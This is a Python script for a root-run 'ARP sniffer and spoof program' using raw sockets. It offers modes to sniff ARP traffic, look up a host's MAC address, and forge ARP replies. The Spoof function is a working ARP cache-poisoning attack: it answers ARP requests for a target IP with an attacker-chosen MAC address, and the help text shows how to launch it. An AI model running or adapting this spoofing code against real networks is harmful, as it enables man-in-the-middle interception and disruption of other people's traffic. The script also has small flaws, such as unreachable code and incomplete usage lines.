#!/usr/bin/python3
import socket
import struct
import uuid
import sys
import os
import binascii


def getsocketinformation():
    #create socket and receive all type of packets
    a_scoket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))

    a_scoket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    a_scoket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    a_scoket.bind((os.listdir('/sys/class/net/')[1], 0))

    return a_scoket

def getmac():
    List = []
    Mymac = uuid.getnode()
    count = 0
    while(count < 6):
        List = [Mymac % 0x100] + List
        Mymac //= 0x100
        count += 1
    return List

def getpacketinformation():
    arpin = {
        'my_mac' : struct.pack('!6B',*getmac()),
        'my_ip' : socket.inet_aton(socket.gethostbyname(socket.gethostname())),
        'arp_type' : struct.pack('!H', 0x0806)
    }
    packet = {

        #header
        'target_mac_addr' : struct.pack('!6B',0xFF,0xFF,0xFF,0xFF,0xFF,0xFF),
        'source_mac_addr' : struct.pack('!6B',*getmac()),
        'frame_type' : struct.pack('!H',0x0806),

        #arp body
        'arp_body_hw_type' : struct.pack('!H', 0x0001),
        'arp_body_protocal_type' : struct.pack('!H', 0x0800),
        'arp_body_hw_length' : struct.pack('!B', 0x06),
        'arp_body_protocal_length' : struct.pack('!B', 0x04),
        'arp_body_opcode' : struct.pack('!H', 0x0001),
        'arp_body_source_mac' : struct.pack('!6B',*getmac()),
        'arp_body_source_ip' : socket.inet_aton(socket.gethostbyname(socket.gethostname())),
        'arp_body_target_mac' : struct.pack('!6B',0,0,0,0,0,0),
        'arp_body_target_ip' : ''
    }
    return packet

def receive(my_socket):
    my_packet = getpacketinformation()

    frame = my_socket.recvfrom(2048)
    header = frame[0][0:14]
    arp_body = frame[0][14:42]

    header_temp = struct.unpack("!6s6s2s", header)
    arp_body_temp = struct.unpack("!2s2s1s1s2s6s4s6s4s", arp_body)

    my_packet['target_mac_addr'] = binascii.hexlify(header_temp[0],':')
    my_packet['source_mac_addr'] = binascii.hexlify(header_temp[1],':')
    my_packet['frame_type'] = header_temp[2]

    my_packet['arp_body_opcode'] = arp_body_temp[4]
    my_packet['arp_body_source_mac'] = binascii.hexlify(arp_body_temp[5],':')
    my_packet['arp_body_source_ip'] = socket.inet_ntoa(arp_body_temp[6])
    my_packet['arp_body_target_mac'] = binascii.hexlify(arp_body_temp[7],':')
    my_packet['arp_body_target_ip'] = socket.inet_ntoa(arp_body_temp[8])

    return my_packet

def listening():
    print("### ARP sniffer mode ###")
    while True:
        _Packet = receive(getsocketinformation())
        
        if _Packet['frame_type'] != b'\x08\x06':
            continue

        if _Packet['arp_body_opcode'] == b'\x00\x01':
            print("arp request")
        
        if _Packet['arp_body_opcode'] == b'\x00\x02':
            print("arp response")

        print("Get ARP packet - Who has " + _Packet['arp_body_target_ip'] + " ?      Tell " + _Packet['arp_body_source_ip'])

def Listening(ip):
    print("### ARP sniffer mode ###")
    
    while True:
        _Packet = receive(getsocketinformation())

        
        if _Packet['frame_type'] != b'\x08\x06':
            continue
        #print(_Packet['arp_body_target_ip'])
        #receive target or source is "ip" only
        if _Packet['arp_body_target_ip'] != ip and _Packet['arp_body_source_ip'] != ip:
            continue

        if _Packet['arp_body_opcode'] == b'\x00\x01':
            print("arp request")
        
        if _Packet['arp_body_opcode'] == b'\x00\x02':
            print("arp response")

        print("Get ARP packet - Who has " + _Packet['arp_body_target_ip'] + " ?      Tell " + _Packet['arp_body_source_ip'])

def question(ip):
    Arp_packet = getpacketinformation()
    Arp_socket = getsocketinformation()

    Arp_packet['arp_body_target_ip'] = socket.inet_aton(ip)

    Arp_packet_list = [ i for i in Arp_packet.values() ]
    


    Arp_packet['arp_body_source_ip'] = socket.inet_ntoa(Arp_packet['arp_body_source_ip'])
    Arp_packet['arp_body_target_ip'] = socket.inet_ntoa(Arp_packet['arp_body_target_ip'])



    Arp_socket.send(b''.join(Arp_packet_list))
    
    print("Get ARP packet - Who has " + Arp_packet['arp_body_target_ip'] + " ?      Tell " + Arp_packet['arp_body_source_ip'])

    while True:
        Arp_responce = receive(Arp_socket)

        if Arp_responce['frame_type'] != b'\x08\x06':
           continue
        

        if Arp_responce['arp_body_source_ip'] == ip:
            print("MAC address of " + Arp_responce['arp_body_source_ip'] + " is " + bytes.decode(Arp_responce['arp_body_source_mac']))
            break

def Spoof(fack_mac , target_ip):
    a_scoket = getsocketinformation()

    fack_mac = str.encode(fack_mac)
    fack_mac = binascii.unhexlify(fack_mac.replace(b':', b''))
    while True:
        Arp_request = receive(a_scoket)

        if Arp_request['frame_type'] != b'\x08\x06':
            continue

        if Arp_request['arp_body_opcode'] != b'\x00\x01' or Arp_request['arp_body_target_ip'] != target_ip:
            continue
            print("arp request")
 
        print("Arp request target ip is " + Arp_request['arp_body_target_ip'])

        print("fack arp responce :")

        fack_arp_responce = getpacketinformation()
        
        Arp_request['arp_body_source_mac'] = bytes.decode(Arp_request['arp_body_source_mac'])
        Arp_request['arp_body_source_mac'] = Arp_request['arp_body_source_mac'].replace(':','')

        fack_arp_responce['target_mac_addr'] = binascii.unhexlify(Arp_request['arp_body_source_mac'])
        fack_arp_responce['source_mac_addr'] = fack_mac
        fack_arp_responce['arp_body_opcode'] = struct.pack('!H', 0x0002)
        fack_arp_responce['arp_body_source_mac'] = fack_mac
        fack_arp_responce['arp_body_target_ip'] = socket.inet_aton(Arp_request['arp_body_source_ip'])
        fack_arp_responce['arp_body_source_ip'] = socket.inet_aton(target_ip)
        fack_arp_responce['arp_body_target_mac'] = binascii.unhexlify(Arp_request['arp_body_source_mac'])
        
        
        fack_arp_responce_list = [ k for k in fack_arp_responce.values() ]

        a_scoket.send(b''.join(fack_arp_responce_list))
        print("Send successfull.")
        exit()



def main(run):
    if os.geteuid() != 0:
        print("ERROR: You must be root to use the tool!")
        exit()

    print("[ ARP sniffer and spoof program ]")

    if run[0] == '-help':
        print("Format :")
        print("1) sudo python3 arp.py -l -a")
        print("2) sudo python3 arp.py -l <filter_ip_address>")
        print("3) sudo python3 -q <query_ip_address>")
        print("4) sudo python3 <fack_mac_address> <target_ip_address>")

    elif run == ['-l','-a']:
        listening()

    elif run[0] == '-l':
        Listening(run[1])

    elif run[0] == '-q':
        question(run[1])

    else:
        Spoof(run[0],run[1])
    



if __name__ == '__main__':
    main(sys.argv[1:])

"""
def a(n):
    code

b = 10
a(b)
"""
